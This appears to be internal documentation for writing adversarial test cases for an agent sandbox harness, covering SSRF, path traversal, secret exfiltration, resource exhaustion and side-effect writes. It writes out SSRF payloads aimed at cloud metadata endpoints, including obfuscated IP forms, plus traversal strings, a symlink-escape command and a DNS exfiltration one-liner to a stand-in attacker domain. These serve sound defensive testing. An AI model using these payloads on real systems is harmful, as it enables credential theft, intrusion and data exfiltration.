# Threat Classes And Adversarial Recipes

Use this when writing `adversarialCases` for a harness spec — each recipe below is a
concrete, runnable attack, not a description of a risk category.

## The five threat classes

| Threat class | What the adversary wants | Containment invariant (what must hold) |
| --- | --- | --- |
| `ssrf` | Reach a host the sandbox should never reach: cloud metadata, loopback services, internal RFC1918/CGNAT ranges | Every outbound connection resolves to an allowlisted host; literal-IP and DNS obfuscation are classified, not string-matched |
| `path-traversal` | Read or write outside the jail root | Every filesystem path used by the sandboxed code resolves (post-realpath) to a location inside the jail root, including through symlinks |
| `secret-exfil` | Move a credential value out of the sandbox via any channel | No real credential is ever placed where sandboxed code can read it; canary/fake values are used and monitored for any egress attempt carrying them |
| `resource-exhaustion` | Deny service to the host or other tenants: fork bombs, memory bombs, disk-fill, CPU spin | Process count, memory, CPU time, and disk writes are capped and enforced by the kernel/runtime, not by the sandboxed code's own restraint |
| `side-effect-write` | Make a change outside the intended output surface: cron files, launch agents, shell profiles, git hooks | Writes are restricted to an explicit output allowlist; sensitive subpaths (`~/.ssh`, `~/Library/LaunchAgents`, `.git/hooks`) are refused even inside an otherwise-allowed root |

A harness with zero cases in any of these five classes cannot claim containment for
that class — `scripts/containment_audit.mjs` flags this as a hard finding, not a
warning, because "we didn't test it" and "it's safe" are indistinguishable from
the outside.

## Concrete adversarial recipes

### SSRF to the cloud metadata endpoint

The single most common real-world SSRF payload against agent tool-use is the AWS/GCP
metadata endpoint, because it hands back credentials with no auth:

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/computeMetadata/v1/ (GCP; needs Metadata-Flavor: Google header)
```

Variants that defeat a naive string-match denylist (`if (url.includes('169.254'))`):

- Decimal IP: `http://2852039166/latest/meta-data/`
- Octal: `http://0251.0376.0251.0376/`
- Hex: `http://0xa9fea9fe/`
- IPv6-mapped: `http://[::ffff:169.254.169.254]/`
- DNS name that resolves to the metadata IP at request time (rebinding) — a naive
  "resolve once, check, then fetch" guard is vulnerable to TOCTOU; resolve-and-pin
  the socket, don't re-resolve.
- Open redirect through an allowlisted host: `https://allowlisted.example.com/r?u=http://169.254.169.254/`
  — an allowlist on the *initial* host is not enough if the client follows redirects
  to a non-allowlisted host; disable redirect-following or re-validate every hop.

Loopback and private-range variants to include alongside metadata: `127.0.0.1`,
`0.0.0.0`, `[::1]`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, link-local
`169.254.0.0/16` (metadata lives in this range on both AWS and GCP), and CGNAT
`100.64.0.0/10`.

### Path traversal via `../` and symlinks

Two distinct attack shapes — a harness needs at least one case per shape:

1. **Direct traversal**: the sandboxed code (or the untrusted payload it's fed)
   supplies a path like `../../../../etc/cron.d/evil` or an absolute path
   `/etc/shadow`. A guard that only checks for the literal substring `../` is
   defeated by URL-encoding (`%2e%2e%2f`), double-encoding, or simply an absolute
   path that never contains `..` at all.
2. **Pre-planted symlink escape**: the sandboxed code creates a symlink *inside*
   the jail root that points *outside* it (`ln -s /etc/cron.d evil-link`), then
   writes through the link. A guard that resolves the requested path but not the
   *existing* prefix on disk will pass the check and still write outside the jail.
   The fix is to realpath the longest existing prefix of the target before writing,
   not just the target string.

Recipe for a test case: create the jail root, plant a symlink inside it pointing to
a scratch directory outside the jail, then attempt a write through the symlink path.
Assert the write is refused and no file appears outside the jail.

### Secret exfiltration via DNS

DNS queries often escape network policies that block HTTP/HTTPS egress, because DNS
resolution is assumed to be "just lookups." Encode a secret into a subdomain label
and issue a lookup:

```
nslookup $(echo -n "$FAKE_API_KEY" | base32).attacker-controlled.example.com
```

The attacker's authoritative nameserver logs the query and recovers the secret from
the subdomain label — no response payload is even needed. Containment requires DNS
egress to go through the same allowlist as HTTP/HTTPS egress (default-deny, resolve
only allowlisted domains), not an assumption that "DNS is just metadata."

Other exfil channels worth a case each: HTTP header/query-string smuggling to an
allowlisted-looking-but-attacker-owned subdomain, timing side channels (unlikely to
be worth a case unless the sandbox handles genuinely high-value secrets), and
writing the secret to a file inside the jail root that a *separate*, less-scrutinized
output path (e.g. a build artifact upload) later ships outside the sandbox.

## Fail-closed vs fail-open — how to decide per case

Ask: **if this specific check cannot run or its result is ambiguous, what happens?**

- Unresolvable hostname, malformed URL, DNS timeout → fail closed (deny the request).
- Symlink resolution hits a permission error partway through → fail closed.
- Unknown trigger/event kind reaching the trust gate → fail closed (lowest tier).
- Resource limit enforcement mechanism itself fails to attach (e.g. cgroup creation
  fails) → fail closed (refuse to run the sandboxed code at all, don't run it
  unconfined).

There is no adversarial threat class where fail-open is the correct default. If a
harness spec or an individual case declares `failMode: fail-open`, treat it as a
disqualifying finding unless it is explicitly scoped to a documented, accepted
residual risk (ADR-0093 §10 is the model for how to write that down honestly).
